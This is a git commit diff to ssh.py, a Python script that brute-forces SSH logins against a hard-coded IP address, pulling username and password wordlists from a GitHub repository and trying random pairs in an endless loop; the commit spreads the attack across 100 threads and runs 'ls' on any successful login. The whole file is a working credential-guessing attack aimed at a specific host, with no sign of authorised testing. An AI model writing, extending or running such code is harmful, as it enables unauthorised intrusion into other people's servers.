3d6464320b7f68f358bf820f3f7ee9a60b94d558
Nexity <46597698+Nexity@users.noreply.github.com>
2021-03-22 08:51:03 +0800

    fun multithreading

--- ssh.py
+++ ssh.py
@@ -1,24 +1,29 @@
 import paramiko
 import random
 import requests
+import threading
 
 host = "95.216.66.105"
 port = 22
 usernames = requests.get("https://raw.githubusercontent.com/o7-Fire/General/master/usernames.txt")
 passwords = requests.get("https://raw.githubusercontent.com/o7-Fire/General/master/passwords.txt")
-
 command = "ls"
-attempts = 0
-while True:
-    username = random.choice(usernames.text.split("\n"))
-    password = random.choice(passwords.text.split("\n"))
-    try:
-        ssh = paramiko.SSHClient()
-        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-        ssh.connect(host, port, username, password)
-        stdin, stdout, stderr = ssh.exec_command(command)
-        lines = stdout.readlines()
-        print(lines)
-    except:
-        attempts = attempts + 1
-        print("attempts: " + str(attempts))
+
+def tryssh():
+    while True:
+        username = random.choice(usernames.text.split("\n"))
+        password = random.choice(passwords.text.split("\n"))
+        try:
+            ssh = paramiko.SSHClient()
+            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+            ssh.connect(host, port, username, password)
+            stdin, stdout, stderr = ssh.exec_command(command)
+            lines = stdout.readlines()
+            print(lines)
+        except:
+            print("Didnt work")
+
+if __name__ == '__main__':
+    for i in range(100):
+        t1 = threading.Thread(target=tryssh)
+        t1.start()
